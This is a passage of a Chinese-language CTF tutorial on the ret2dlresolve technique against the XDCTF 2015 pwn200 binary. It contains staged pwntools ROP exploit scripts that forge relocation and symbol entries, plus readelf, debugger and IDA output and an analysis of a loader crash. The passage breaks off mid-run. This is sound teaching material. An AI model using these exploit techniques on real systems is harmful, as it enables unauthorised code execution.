rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>效果如下，仍然输出了 sh 对应的字符串。</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python stage2.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25131
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
32
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="stage-3"><a href="#stage-3" class="headerlink" title="stage 3"></a>stage 3</h5><p>这一次，我们同样控制  <code>_dl_runtime_resolve</code> 函数中的 reloc_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。</p>
<p>鉴于 pwntools 本身并不支持对重定位表项的信息的获取。这里我们手动看一下</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ readelf -r main_partial_relro_32

Relocation section '.rel.dyn' at offset 0x30c contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff4  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
08049ff8  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0
08049ffc  00000806 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x324 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607。具体代码如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">112</span>
bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set esp = base_stage</span>
stack_size <span class="token operator">=</span> <span class="token number">0x800</span> <span class="token comment" spellcheck="true"># new stack size is 0x800</span>
base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> base_stage<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read 100 byte to base_stage</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># write "/bin/sh"</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
got0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.got'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
<span class="token comment" spellcheck="true"># make base_stage+24 ---> fake reloc</span>
write_reloc_offset <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">-</span> rel_plt
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
r_info <span class="token operator">=</span> <span class="token number">0x607</span>

rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>write_reloc_offset<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># fake ret addr of write</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># fake write args, write(1, base_stage+80, sh)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">80</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># construct fake write relocation entry</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这次我们在 base_stage+24 处伪造了一个 write 的重定位项，仍然输出了对应的字符串。</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python stage3.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 24506
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="stage-4"><a href="#stage-4" class="headerlink" title="stage 4"></a>stage 4</h5><p>在 stage3 中，我们控制了重定位表项，但是伪造的重定位表项的内容仍然与 write 函数原来的重定位表项一致。</p>
<p>在这个阶段中，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607&gt;&gt;8=0x6。因此，我们知道 write 对应的符号地址为 0x0804822c。</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ readelf -x .dynsym main_partial_relro_32

Hex dump of section '.dynsym':
  0x080481cc 00000000 00000000 00000000 00000000 ................
  0x080481dc 33000000 00000000 00000000 12000000 3...............
  0x080481ec 27000000 00000000 00000000 12000000 '...............
  0x080481fc 5c000000 00000000 00000000 20000000 \........... ...
  0x0804820c 20000000 00000000 00000000 12000000  ...............
  0x0804821c 3a000000 00000000 00000000 12000000 :...............
  0x0804822c 4c000000 00000000 00000000 12000000 L...............
  0x0804823c 1a000000 00000000 00000000 11000000 ................
  0x0804824c 2c000000 00000000 00000000 11000000 ,...............
  0x0804825c 0b000000 6c860408 04000000 11001000 ....l...........<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为 16 个字节。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">112</span>
bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set esp = base_stage</span>
stack_size <span class="token operator">=</span> <span class="token number">0x800</span> <span class="token comment" spellcheck="true"># new stack size is 0x800</span>
base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> base_stage<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read 100 byte to base_stage</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>

plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

<span class="token comment" spellcheck="true"># make a fake write symbol at base_stage + 32 + align</span>
fake_sym_addr <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">32</span>
align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span>
                <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># since the size of Elf32_Symbol is 0x10</span>
fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align
index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0x10</span>  <span class="token comment" spellcheck="true"># calculate the dynsym index of write</span>
fake_write_sym <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># make fake write relocation at base_stage+24</span>
index_offset <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">-</span> rel_plt
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span> <span class="token comment" spellcheck="true"># calculate the r_info according to the index of write</span>
fake_write_reloc <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>write_got<span class="token punctuation">,</span> r_info<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># construct rop chain</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake ret addr of write</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">80</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_reloc<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># fake write reloc</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> align<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_sym<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># fake write symbol</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接执行后发现并不行</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27370
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>发现程序已经崩溃了，通过 coredump，可以发现程序在 <code>ld-linux.so.2</code> 中崩了。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0xf7f77fed    mov    ebx, dword ptr [edx + 4]
   0xf7f77ff0    test   ebx, ebx
   0xf7f77ff2    mov    ebx, 0
   0xf7f77ff7    cmove  edx, ebx
   0xf7f77ffa    mov    esi, dword ptr gs:[0xc]
   0xf7f78001    test   esi, esi
   0xf7f78003    mov    ebx, 1
   0xf7f78008    jne    0xf7f78078 <0xf7f78078>
    ↓
   0xf7f78078    mov    dword ptr gs:[0x1c], 1
   0xf7f78083    mov    ebx, 5
   0xf7f78088    jmp    0xf7f7800a <0xf7f7800a>
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0x804a7dc ◂— 0x0
... ↓
02:0008│      0x804a7e4 —▸ 0xf7f90000 ◂— 0x26f34
03:000c│      0x804a7e8 —▸ 0x804826c ◂— add    byte ptr [ecx + ebp*2 + 0x62], ch
04:0010│      0x804a7ec ◂— 0x0
... ↓
07:001c│      0x804a7f8 —▸ 0x804a84c ◂— 0x4c /* 'L' */
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0 f7f77fed
   f 1        0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x804a000 r-xp     2000 0      ./main_partial_relro_32
 0x8049000  0x804b000 rw-p     2000 0      [stack]
 0x804a000  0x804b000 rw-p     1000 1000   ./main_partial_relro_32
0xf7d6b000 0xf7f40000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc.so.6
0xf7f40000 0xf7f41000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f41000 0xf7f43000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f43000 0xf7f47000 rw-p     4000 1d7000 /lib/i386-linux-gnu/libc.so.6
0xf7f67000 0xf7f69000 r-xp     2000 0      [vdso]
0xf7f69000 0xf7f90000 r-xp    27000 0      [linker]
0xf7f69000 0xf7f90000 r-xp    27000 0      /lib/ld-linux.so.2
0xf7f90000 0xf7f91000 rw-p     1000 26000  [linker]
0xf7f90000 0xf7f91000 rw-p     1000 26000  /lib/ld-linux.so.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过逆向分析 ld-linux.so.2 </p>
<pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">92</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x7FFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>以及源码可以知道程序是在访问 version 的 hash 时出错。</p>
<pre class="line-numbers language-c"><code class="language-c">        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>
                <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">D_PTR</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>进一步分析可以知道，因为我们伪造了 write 函数的重定位表项，其中 reloc-&gt;r_info 被设置成了比较大的值（由于 index_dynsym 离符号表比较远）。这时候，ndx 的值并不可预期，进而 version 的值也不可预期，因此可能出现不可预期的情况。</p>
<p>通过分析 .dynmic 节，我们可以发现 vernum 的地址为 0x80482d8。</p>
<pre><code>❯ readelf -d main_partial_relro_32

Dynamic section at offset 0xf0c contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x804834c
 0x0000000d (FINI)                       0x8048654
 0x00000019 (INIT_ARRAY)                 0x8049f04
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f08
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804826c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048324
 0x00000011 (REL)                        0x804830c
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482ec
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482d8
 0x00000000 (NULL)                       0x0</code></pre><p>在 ida 中，我们也可以看到相关的信息</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">LOAD:080482D8 ; ELF GNU Symbol Version Table
LOAD:080482D8                 dw 0
LOAD:080482DA                 dw 2                    ; setbuf@@GLIBC_2.0
LOAD:080482DC                 dw 2                    ; read@@GLIBC_2.0
LOAD:080482DE                 dw 0                    ; local  symbol: __gmon_start__
LOAD:080482E0                 dw 2                    ; strlen@@GLIBC_2.0
LOAD:080482E2                 dw 2                    ; __libc_start_main@@GLIBC_2.0
LOAD:080482E4                 dw 2                    ; write@@GLIBC_2.0
LOAD:080482E6                 dw 2                    ; stdin@@GLIBC_2.0
LOAD:080482E8                 dw 2                    ; stdout@@GLIBC_2.0
LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin_used<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那我们可以再次运行看一下伪造后 ndx 具体的值</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27649
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
